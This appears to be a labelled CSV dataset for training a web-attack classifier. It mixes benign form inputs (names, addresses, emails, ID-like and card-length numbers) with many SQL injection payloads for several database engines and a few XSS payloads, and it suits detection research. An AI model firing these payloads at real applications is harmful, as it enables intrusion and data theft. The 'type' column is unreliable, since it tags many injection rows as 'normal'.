Text,attack_type,Label,type
1)) and 2886=1133--,sqli,1,sql
"1%"") rlike sleep(5)#",sqli,1,normal
plans baquerizo,norm,0,normal
"-5058%' union all select 6789,6789,6789,6789,6789#",sqli,1,sql
kulle@coworkers.tl,norm,0,normal
chisvert,norm,0,normal
"plaza villalcazar de sirga, s/n",norm,0,normal
"-4473') union all select 7656,7656#",sqli,1,sql
beda,norm,0,normal
02723270r,norm,0,normal
"calle virgen de la fuensanta, 50 3?b",norm,0,normal
arquiigo guardiola,norm,0,normal
rustir,norm,0,normal
"1%') union all select null,null,null,null,null,null,null#",sqli,1,sql
natn,norm,0,normal
1)) as myxo where 1759=1759 union all select null#,sqli,1,sql
"-3261""))) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""yxms""=""yxms",sqli,1,sql
"-3963"" or 1224=5119",sqli,1,normal
1 where 2649=2649 or (select * from (select(sleep(5)))ydpu)--,sqli,1,sql
a9terisc9,norm,0,normal
1') as lgex where 4068=4068 and 1378=9247--,sqli,1,sql
pipiolo sandrini,norm,0,normal
"1')) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (('brlc'='brlc",sqli,1,normal
hontangas,norm,0,normal
17538,norm,0,normal
pedrosa de ro rbel,norm,0,normal
gillin-kinchelow@fotoseroticas.com.gr,norm,0,normal
vestly.pereda@ladigianni.eh,norm,0,normal
rinaldo,norm,0,normal
"1 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)# cqqs",sqli,1,sql
"1')));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ((('fuyl'='fuyl",sqli,1,sql
"carrera 55,",norm,0,normal
pulsar,norm,0,normal
1) where 5418=5418 union all select null--,sqli,1,sql
con10e4t2,norm,0,normal
7,norm,0,normal
"1))) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((2952=2952",sqli,1,normal
"1));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((3508=3508",sqli,1,sql
tesisteco avi,norm,0,normal
meredith,norm,0,normal
toba,norm,0,normal
1'||(select 'ilkr' from dual where 9296=9296;select case when 7717=7717 then 1 else null end--,sqli,1,sql
duby@mtos.mt,norm,0,normal
nagel ordoes,norm,0,normal
"1')) as hfra where 6500=6500 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
saree,norm,0,normal
bannister-griffel@youtubed.la,norm,0,normal
narros de salduea,norm,0,normal
xilfaga,norm,0,normal
"santisima cruz, 123 10?b",norm,0,normal
"1%"");select (case when (3855=3855) then 3855 else 1/(select 0) end)--",sqli,1,sql
1126,norm,0,normal
26,norm,0,normal
3815,norm,0,normal
d'amico urrea,norm,0,normal
lauther,norm,0,normal
rdenas,norm,0,normal
"1'+(select 'hoqt' where 4877=4877 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
1 where 8578=8578 and 4770=4474--,sqli,1,sql
m941onaria,norm,0,normal
17867,norm,0,normal
55000265c,norm,0,normal
"1'))) and elt(1210=1210,sleep(5)) and ((('mbxh' like 'mbxh",sqli,1,normal
"consolacion 92, 12?h",norm,0,normal
cargu9,norm,0,normal
gumersindo,norm,0,normal
"1"") where 8153=8153;select (case when (3855=3855) then 3855 else 1/(select 0) end)--",sqli,1,sql
monino,norm,0,normal
escncido,norm,0,normal
"-9057"") or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
carbot llanos,norm,0,normal
"1"") and 8635=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
1'||(select 'tcfy' where 4546=4546 and 6969=(select 6969 from pg_sleep(5)))||',sqli,1,sql
seni+l,norm,0,normal
ralf,norm,0,normal
cou@tradedeficit.pg,norm,0,normal
98057218f,norm,0,normal
5350,norm,0,normal
carhu,norm,0,normal
"1"")) as xbhp where 7527=7527;select count(*) from generate_series(1,5000000)--",sqli,1,sql
"1',(case when 3598=2118 then 1 else null end)",sqli,1,normal
"1"") as xrsi where 9498=9498;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
dorita,norm,0,normal
"-3975') or make_set(1943=3499,3499) and ('dawb'='dawb",sqli,1,normal
57417611c,norm,0,normal
diffring9@discon.cv,norm,0,normal
67sm1met93,norm,0,normal
"pl. vianako printzearen, 107 12h",norm,0,normal
41484237b,norm,0,normal
6483,norm,0,normal
6446364885360152,norm,0,normal
"1""))) and 8594=(select 8594 from pg_sleep(5))--",sqli,1,sql
manises,norm,0,normal
7402575875977830,norm,0,normal
"1%"");select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
"1""))) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (((""agaz""=""agaz",sqli,1,sql
"1 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)",sqli,1,sql
"1',(select (case when (3717=3717) then 1 else 3717*(select 3717 from master..sysdatabases) end))",sqli,1,sql
26gad76o,norm,0,normal
rosngela,norm,0,normal
"-4746%""))) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""%""=""",sqli,1,sql
"1""))) rlike sleep(5)#",sqli,1,normal
usufrut*uar,norm,0,normal
3mo5c8po,norm,0,normal
"c/ madrid, 53 5-f",norm,0,normal
"-6945' union all select 5063,5063,5063,5063,5063,5063,5063,5063--",sqli,1,sql
registro,norm,0,normal
de arce millares,norm,0,normal
"1"")) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ((""rtyu"" like ""rtyu",sqli,1,sql
"pasaje salas s/n, 7-f",norm,0,normal
"1) where 1079=1079;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
"1) as cnpv where 4902=4902 and elt(1210=1210,sleep(5))--",sqli,1,sql
echarri,norm,0,normal
"1'))) and elt(1210=1210,sleep(5)) and ((('aiuy'='aiuy",sqli,1,normal
bolly,norm,0,normal
nobrega medianero,norm,0,normal
"1'))) union all select null,null,null,null,null#",sqli,1,sql
"1 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))# lgoz",sqli,1,sql
1) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))),sqli,1,sql
"1%"")));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"1) as ilqx where 8547=8547;select count(*) from generate_series(1,5000000)--",sqli,1,sql
"1%"" or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
"calle fray luis sotelo, 115 7-b",norm,0,normal
14895436s,norm,0,normal
13348536a,norm,0,normal
oros thme,norm,0,normal
1' where 8584=8584 order by 1#,sqli,1,normal
"1))) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1,normal
-1188)) union all select 4711--,sqli,1,sql
pia rusch,norm,0,normal
5055,norm,0,normal
"1'||(select 'osty' from dual where 6433=6433 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))||'",sqli,1,sql
46439230e,norm,0,normal
x:expression8write(1)9>,xss,2,normal
93398116s,norm,0,normal
"-5372"") as wlqm where 2432=2432 union all select 2432,2432,2432,2432,2432,2432#",sqli,1,sql
"1');select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
4761952395684285,norm,0,normal
46824,norm,0,normal
1'||(select 'ovlx' where 8767=8767 or sleep(5))||',sqli,1,sql
-9434') union all select 3106#,sqli,1,sql
naredo reggiardo,norm,0,normal
barrymore@hipermadrid.pe,norm,0,normal
25330,norm,0,normal
alonso,norm,0,normal
breon@sexotelefono.mc,norm,0,normal
3554407381877328,norm,0,normal
7ed1l,norm,0,normal
80920943c,norm,0,normal
"-2375 union all select 1573,1573,1573,1573#",sqli,1,sql
diesing,norm,0,normal
"-7485%'))) union all select 1303,1303,1303,1303,1303,1303,1303,1303,1303--",sqli,1,sql
22470,norm,0,normal
7519305817718575,norm,0,normal
"1'||(select 'wgte' from dual where 6316=6316 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))))||'",sqli,1,sql
-4108') or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ('tqjx'='tqjx,sqli,1,sql
"1'+(select hkrg where 3665=3665;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1,sql
"c/ del ferrocarril, 152,",norm,0,normal
"1'||(select 'qdkb' where 4331=4331;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5))||'",sqli,1,sql
"1"" and 3824=benchmark(5000000,md5(0x76555642)) and ""mynm"" like ""mynm",sqli,1,normal
"-6263%"")) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((""%""=""",sqli,1,sql
belkis,norm,0,normal
3748443978921311,norm,0,normal
feutlins,norm,0,normal
39sch6nz6da,norm,0,normal
"1"") where 7753=7753;select pg_sleep(5)--",sqli,1,sql
iznatoraf,norm,0,normal
foto3rfico,norm,0,normal
"-1<div style=""background-image: url(javascript:document.cookie=true;)"">",xss,2,xss
46369,norm,0,normal
4238960811185827,norm,0,normal
wickens@cpanelhost.com.ht,norm,0,normal
"1' procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and 'zlxw'='zlxw",sqli,1,normal
"1"")) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ((""xccy""=""xccy",sqli,1,sql
31087137s,norm,0,normal
alternat,norm,0,normal
1));select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
suti8me9te,norm,0,normal
8683,norm,0,normal
"-5911 union all select 2245,2245,2245,2245,2245,2245#",sqli,1,sql
tcito,norm,0,normal
2813,norm,0,normal
37209,norm,0,normal
orera,norm,0,normal
aguilar de cods,norm,0,normal
6.r9b05o,norm,0,normal
"-1303' union all select 4840,4840#",sqli,1,sql
1 where 6827=6827;select case when 7717=7717 then 1 else null end--,sqli,1,sql
17773,norm,0,normal
5509893161352437,norm,0,normal
angelle,norm,0,normal
berrigan.demme@soyriojano.kg,norm,0,normal
vari1l8,norm,0,normal
45555264s,norm,0,normal
"-7236 or make_set(9618=6919,6919)",sqli,1,normal
"1"" and 8594=(select 8594 from pg_sleep(5))--",sqli,1,sql
cuboides,norm,0,normal
yun,norm,0,normal
1) where 8616=8616 and 2006=2006,sqli,1,normal
indiestro,norm,0,normal
"1)) as prnp where 4932=4932 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",sqli,1,sql
71579092x,norm,0,normal
"-8344 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))-- wjpa",sqli,1,sql
"1%') or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
98p+e,norm,0,normal
"1' where 9116=9116 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
fuente el saz,norm,0,normal
guisset melo,norm,0,normal
"1,(select (case when (7616=7616) then 1 else 1/(select 0) end))",sqli,1,sql
"-1525'))) union all select 4110,4110,4110,4110,4110,4110#",sqli,1,sql
"cabaeros, 131",norm,0,normal
"1')) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (('ywxe' like 'ywxe",sqli,1,normal
"1%"" and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ""%""=""",sqli,1,sql
dement,norm,0,normal
santa cruz de la palma,norm,0,normal
shoeb,norm,0,normal
6701924725777489,norm,0,normal
"1,iif(6333=1227,1,1/0)",sqli,1,normal
"-3924'||(select 'ssld' from dual where 6229=6229 union all select 6229,6229,6229,6229,6229#",sqli,1,sql
44549,norm,0,normal
47628834c,norm,0,normal
61929820c,norm,0,normal
17405,norm,0,normal
"1'+(select zpdf where 2938=2938;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)+'",sqli,1,sql
"1'))) union all select null,null,null,null,null,null,null,null,null#",sqli,1,sql
m8rrega,norm,0,normal
escarpelo,norm,0,normal
james_ponnamma@autobuses-hibridos.tn,norm,0,normal
"1')) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (('vcph'='vcph",sqli,1,sql
5786008196722373,norm,0,normal
1'||(select 'gdzt' where 4950=4950;select sleep(5)#,sqli,1,sql
34406,norm,0,normal
"1'))) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((('viad' like 'viad",sqli,1,sql
">""<input type=""image"" dynsrc=""javascript:document.cookie=true;"">",xss,2,xss
"1',(select * from generate_series(5609,5609,case when (5609=5609) then 1 else 0 end) limit 1)",sqli,1,sql
plza. nuestra seora de los reyes 98,norm,0,normal
"1')));call regexp_substring(repeat(right(char(3702),0),500000000),null) and ((('opyt'='opyt",sqli,1,sql
prdica,norm,0,normal
"1%""));select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--",sqli,1,sql
77731441c,norm,0,normal
-2951 or 4189=2291,sqli,1,normal
"1%"");select (case when (6179=8476) then 6179 else cast(1 as int)/(select 0 from dual) end) from dual--",sqli,1,sql
49649363e,norm,0,normal
"1'+(select 'ycvl' where 8415=8415 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1,sql
gonska@estaestuweb.com.af,norm,0,normal
shirene,norm,0,normal
"-6639') as trll where 6271=6271 union all select 6271,6271,6271#",sqli,1,sql
48573885r,norm,0,normal
alfamn,norm,0,normal
"1"";select (case when (2576=7563) then 2576 else 1/(select 0) end)--",sqli,1,sql
"1'||(select 'zrea' from dual where 1223=1223 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
"-6130 union all select 3211,3211,3211,3211,3211,3211,3211,3211,3211#",sqli,1,sql
"1' and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))",sqli,1,normal
42113,norm,0,normal
nataliya,norm,0,normal
alcacil,norm,0,normal
heilig,norm,0,normal
pagni7@freecreditcheck.bg,norm,0,normal
vanity@espaciodelpintor.kn,norm,0,normal
"-2168) union all select 4980,4980,4980,4980,4980,4980,4980,4980,4980--",sqli,1,sql
42ache,norm,0,normal
e5f215o6o,norm,0,normal
"1) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))",sqli,1,sql
parra,norm,0,normal
"calle fernando galvan, 192, 7b",norm,0,normal
"1') where 2928=2928;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
"-2745') or elt(1032=1032,3623) and ('vfxq'='vfxq",sqli,1,normal
"1""));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,1,sql
uncastillo,norm,0,normal
hao,norm,0,normal
"1';select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and 'fbnx'='fbnx",sqli,1,sql
1'||(select 'bezt' where 7876=7876;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,sqli,1,sql
mori@itrends.do,norm,0,normal
1%'))) union all select null#,sqli,1,sql
25186,norm,0,normal
s4g51r,norm,0,normal
"1%') or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
grueneic,norm,0,normal
rigand@suncorp.mk,norm,0,normal
tele,norm,0,normal
lezo,norm,0,normal
43746,norm,0,normal
soman,norm,0,normal
salustio,norm,0,normal
baos de molgas,norm,0,normal
"1'||(select 'jnsd' from dual where 2316=2316 union all select null,null,null,null,null,null,null#",sqli,1,sql
kalpak,norm,0,normal
"1'||(select 'qgnz' where 6446=6446;select count(*) from generate_series(1,5000000)--",sqli,1,sql
baggerma,norm,0,normal
"1'+(select tafk where 9652=9652;select benchmark(5000000,md5(0x714e4153))#",sqli,1,sql
"<layer src=""javascript:document.cookie=true;""></layer>",xss,2,xss
ostapchuk casal,norm,0,normal
tr5sn5c0o,norm,0,normal
"-4711' in boolean mode) union all select 8007,8007,8007,8007,8007,8007--",sqli,1,sql
pike@multasdetransito.gf,norm,0,normal
"1) as afxc where 7497=7497;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,sql
guillem paip,norm,0,normal
"-7258 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
19115,norm,0,normal
"1%'))) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((('%'='",sqli,1,sql
"1'))) and make_set(8403=8403,8899) and ((('oacz'='oacz",sqli,1,normal
zarzosa de ro pisuerga,norm,0,normal
fabricia,norm,0,normal
40370,norm,0,normal
demren,norm,0,normal
nesserin,norm,0,normal
servando,norm,0,normal
"1') or elt(6272=6272,sleep(5)) and ('yznd' like 'yznd",sqli,1,normal
9842153778086197,norm,0,normal
"1""));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",sqli,1,sql
"1"" where 6501=6501;select (case when (3855=3855) then 3855 else 1/(select 0) end)--",sqli,1,sql
bonete,norm,0,normal
talmudista,norm,0,normal
"1%')) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
select 'qqpjq'||(case 5118 when 5118 then 1 else 0 end)||'qzvzq' from rdb$database,sqli,1,sql
sencelles,norm,0,normal
"1';call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and 'nhuk'='nhuk",sqli,1,sql
9,norm,0,normal
kenta1,norm,0,normal
licia,norm,0,normal
8735960294384947,norm,0,normal
71834216h,norm,0,normal
"ingeniero pedro leon, 160, 10-b",norm,0,normal
"1%"")));iif(1217=8831,1,1/0)",sqli,1,sql
hammong4@asyra.st,norm,0,normal
48549953n,norm,0,normal
9690868627126482,norm,0,normal
knippenberg@soyriojano.cf,norm,0,normal
7730641296571131,norm,0,normal
franza,norm,0,normal
-6529') or (4309=1601)*1601,sqli,1,normal
"-3868')) or make_set(6809=1236,1236) and (('evnj'='evnj",sqli,1,normal
25512,norm,0,normal
"1"")) as thoj where 1577=1577 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
6249,norm,0,normal
"-1591 where 3291=3291 union all select 3291,3291,3291,3291,3291,3291,3291,3291,3291#",sqli,1,sql
decimon4na,norm,0,normal
50159319e,norm,0,normal
8936,norm,0,normal
"plaza mayor, s/n 2-g",norm,0,normal
09840824k,norm,0,normal
calle caro 10 10?e,norm,0,normal
6529215202550061,norm,0,normal
arpoundren@20horas.bs,norm,0,normal
nacer,norm,0,normal
"1"" where 2619=2619 and 2823=5100#",sqli,1,normal
c35t2ib6ci1,norm,0,normal
canosa,norm,0,normal
5838987688567542,norm,0,normal
-3578'))) order by 1--,sqli,1,sql
culler castanyer,norm,0,normal
17179,norm,0,normal
thayra,norm,0,normal
zuzana,norm,0,normal
"1%"") and (6016=4763)*4763 and (""%""=""",sqli,1,normal
"1%' union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,sql
mieza,norm,0,normal
6273831231107298,norm,0,normal
toso,norm,0,normal
desportilladura,norm,0,normal
kannel,norm,0,normal
43391,norm,0,normal
"omellons, els",norm,0,normal
"-5667%')) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('%'='",sqli,1,sql
dundas@informatica2009.jo,norm,0,normal
"1));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
hoyo higueron 32 3-f,norm,0,normal
"1%') or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ('%'='",sqli,1,sql
62,norm,0,normal
78,norm,0,normal
"1') and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
-8966%' or (7475=4014)*4014 and '%'=',sqli,1,normal
"1)) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
.espejo,norm,0,normal
22194,norm,0,normal
"1%"" and 9198=9198--",sqli,1,sql
copes,norm,0,normal
"calle doctor fleming 52,",norm,0,normal
hitching,norm,0,normal
"1"")));begin dbms_lock.sleep(5); end and (((""poee""=""poee",sqli,1,sql
zemanek,norm,0,normal
10620,norm,0,normal
"1) where 2232=2232;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,sql
barcote,norm,0,normal
velilla de los ajos,norm,0,normal
-4873'))) or 3038=3038,sqli,1,normal
1));select (case when (8113=8981) then 8113 else 1/(select 0) end)--,sqli,1,sql
valentino,norm,0,normal
nadina,norm,0,normal
eseyente,norm,0,normal
"calle santander, 0,",norm,0,normal
garzon6@mtos.ro,norm,0,normal
18439608w,norm,0,normal
"1%"") and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (""%""=""",sqli,1,sql
deysi,norm,0,normal
desamueblar,norm,0,normal
"1' and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'eimq'='eimq",sqli,1,sql
"1"";select benchmark(5000000,md5(0x714e4153))#",sqli,1,sql
chascar,norm,0,normal
"1'));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (('vjdk' like 'vjdk",sqli,1,sql
cabot camaran,norm,0,normal
"1') where 6328=6328 union all select null,null,null,null,null,null,null,null,null#",sqli,1,sql
"-3347%"" or 9323=9323#",sqli,1,normal
"c/ capella, 141, 4?g",norm,0,normal
fraga guevara,norm,0,normal
"-8429'))) or make_set(9354=9354,7185) and ((('bwih' like 'bwih",sqli,1,normal
"1"") where 1666=1666 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
92624028s,norm,0,normal
1')) and 2401=4693 and (('ssrm'='ssrm,sqli,1,normal
03600,norm,0,normal
disipar,norm,0,normal
"<img """"""><script>alert(""xss"")</script>"">",xss,2,xss
"c/ arroyo de las pavas, 183, 13?c",norm,0,normal
chueca,norm,0,normal
toses,norm,0,normal
1)));select (case when (6204=1913) then 6204 else 6204*(select 6204 from information_schema.character_sets) end)#,sqli,1,sql
lara,norm,0,normal
sirevici,norm,0,normal
e2paq48t282r,norm,0,normal
"-5606) union all select 7118,7118,7118,7118,7118,7118,7118,7118,7118#",sqli,1,sql
1') and 2564=3234--,sqli,1,sql
"1"" where 2131=2131 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,1,sql
6848759858802316,norm,0,normal
wesselhoft,norm,0,normal
luego,norm,0,normal
"pasaje santo angel, 190,",norm,0,normal
s46ro6,norm,0,normal
"fregeneda, la",norm,0,normal
81717068t,norm,0,normal
<img+src=x+onerror=prompt(1);>,xss,2,xss
kangelis,norm,0,normal
"1%'));select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
"1') as taay where 7027=7027 and elt(4249=4249,7259)--",sqli,1,sql
cseda,norm,0,normal
4341,norm,0,normal
"1%"";select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",sqli,1,sql
-3846%' or 6872=6872 and '%'=',sqli,1,normal
"1%"" or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
walberto,norm,0,normal
"1"") and sleep(5)#",sqli,1,normal
tindall-bourne@pintandomucho.cg,norm,0,normal
cartaya,norm,0,normal
-6567')) union all select 3217#,sqli,1,sql
"c/ mare de deu de la merce, s/n, 8-e",norm,0,normal
mannoers@magichobby.se,norm,0,normal
heintje0@alpesfranceses.com.ro,norm,0,normal
"1%"") rlike (select (case when (7736=7642) then 1 else 0x28 end)) and (""%""=""",sqli,1,sql
"-2441' union all select 1853,1853,1853,1853,1853,1853,1853--",sqli,1,sql
nogueira de ramun,norm,0,normal
1%'));select sleep(5)#,sqli,1,sql
"calle blas infante 52, 6-h",norm,0,normal
leilan,norm,0,normal
"-8919"" or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""nstr""=""nstr",sqli,1,sql
escogido francesc,norm,0,normal
"pl. de monteleon 60,",norm,0,normal
fant@tiposdedrogas.gg,norm,0,normal
40027603j,norm,0,normal
"1' where 5023=5023 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
46625,norm,0,normal
westermeier,norm,0,normal
"-9558""))) union all select 2935,2935,2935,2935,2935--",sqli,1,sql
6estila$torio,norm,0,normal
"1')) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
02124892z,norm,0,normal
"-9718%"") union all select 9515,9515,9515#",sqli,1,sql
"-4756"")) union all select 6846,6846,6846,6846,6846,6846,6846#",sqli,1,sql
selva,norm,0,normal
estaol bellet,norm,0,normal
elsen@whitehat.td,norm,0,normal
rupp@djbroadcast.gov,norm,0,normal
